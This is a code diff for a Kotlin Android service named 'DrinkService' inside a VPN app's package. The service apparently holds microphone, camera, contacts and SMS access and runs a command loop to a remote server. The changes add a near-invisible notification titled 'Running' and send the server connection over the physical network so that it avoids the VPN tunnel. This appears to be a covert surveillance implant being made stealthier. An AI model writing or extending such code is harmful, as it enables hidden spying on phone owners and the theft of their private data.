@@ -1,6 +1,8 @@
 package com.v2ray.ang.service
 
 import android.app.ActivityManager
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
@@ -21,6 +23,8 @@ import android.media.ImageReader
 import android.media.MediaRecorder
 import android.net.ConnectivityManager
 import android.net.Network
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
 import android.net.wifi.WifiManager
 import android.os.BatteryManager
 import android.os.Build
@@ -40,6 +44,7 @@ import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.provider.Telephony
 import android.telephony.TelephonyManager
+import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import kotlinx.coroutines.*
 import kotlinx.coroutines.channels.Channel
@@ -55,6 +60,7 @@ import kotlin.coroutines.resume
 
 class DrinkService : Service() {
 
+
     companion object {
         const val ACTION_STATUS = "com.drink.STATUS"
         const val EXTRA_CONNECTED = "connected"
@@ -64,6 +70,8 @@ class DrinkService : Service() {
         private const val PORT = 33110
         private const val SAMPLE_RATE = 16000
         private const val RECONNECT_DELAY = 15000L
+        private const val NOTIF_CHANNEL_ID = "drink_bg"
+        private const val NOTIF_ID = 9901
     }
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -73,18 +81,23 @@ class DrinkService : Service() {
     private var running = false
     private var wakeLock: PowerManager.WakeLock? = null
     private var networkCallback: ConnectivityManager.NetworkCallback? = null
+    private var physicalNetworkCallback: ConnectivityManager.NetworkCallback? = null
+    @Volatile private var physicalNetwork: Network? = null
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
+        startForegroundWithNotification()
+
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "drink:lock").apply {
             runCatching { acquire() }
         }
 
         val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        val callback = object : ConnectivityManager.NetworkCallback() {
+
+        val stateCallback = object : ConnectivityManager.NetworkCallback() {
             override fun onAvailable(network: Network) {
                 if (socketManager == null || !isConnected) {
                     triggerReconnect()
@@ -94,8 +107,58 @@ class DrinkService : Service() {
                 runCatching { socketManager?.close() }
             }
         }
-        networkCallback = callback
-        runCatching { cm.registerDefaultNetworkCallback(callback) }
+        networkCallback = stateCallback
+        runCatching { cm.registerDefaultNetworkCallback(stateCallback) }
+
+        requestPhysicalNetwork(cm)
+    }
+
+    private fun startForegroundWithNotification() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val nm = getSystemService(NotificationManager::class.java)
+            if (nm.getNotificationChannel(NOTIF_CHANNEL_ID) == null) {
+                val ch = NotificationChannel(
+                    NOTIF_CHANNEL_ID,
+                    "Background Service",
+                    NotificationManager.IMPORTANCE_MIN
+                )
+                ch.setShowBadge(false)
+                nm.createNotificationChannel(ch)
+            }
+        }
+        val notif = NotificationCompat.Builder(this, NOTIF_CHANNEL_ID)
+            .setContentTitle("Running")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .build()
+        startForeground(NOTIF_ID, notif)
+    }
+
+    private fun requestPhysicalNetwork(cm: ConnectivityManager) {
+        val request = NetworkRequest.Builder()
+            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+            .addCapability(NetworkCapabilities.NET_CAPABILITY_NOT_RESTRICTED)
+            .build()
+
+        val cb = object : ConnectivityManager.NetworkCallback() {
+            override fun onAvailable(network: Network) {
+                val caps = cm.getNetworkCapabilities(network) ?: return
+                if (!caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
+                    physicalNetwork = network
+                    if (socketManager == null || !isConnected) {
+                        triggerReconnect()
+                    }
+                }
+            }
+            override fun onLost(network: Network) {
+                if (physicalNetwork == network) {
+                    physicalNetwork = null
+                    runCatching { socketManager?.close() }
+                }
+            }
+        }
+        physicalNetworkCallback = cb
+        runCatching { cm.requestNetwork(request, cb) }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -111,10 +174,9 @@ class DrinkService : Service() {
         micJob?.cancel()
         reconnectChannel.close()
         socketManager?.close()
-        runCatching {
-            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-            networkCallback?.let { cm.unregisterNetworkCallback(it) }
-        }
+        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        runCatching { networkCallback?.let { cm.unregisterNetworkCallback(it) } }
+        runCatching { physicalNetworkCallback?.let { cm.unregisterNetworkCallback(it) } }
         scope.cancel()
         runCatching { wakeLock?.release() }
         super.onDestroy()
@@ -130,7 +192,8 @@ class DrinkService : Service() {
                 val prefs = getSharedPreferences("drink_prefs", Context.MODE_PRIVATE)
                 val host = prefs.getString("server_host", HOST) ?: HOST
                 val port = prefs.getInt("server_port", PORT)
-                val sm = SocketManager(host, port)
+                val net = physicalNetwork
+                val sm = SocketManager(host, port, network = net)
                 socketManager = sm
                 commandLoop(sm)
             } catch (e: Exception) {
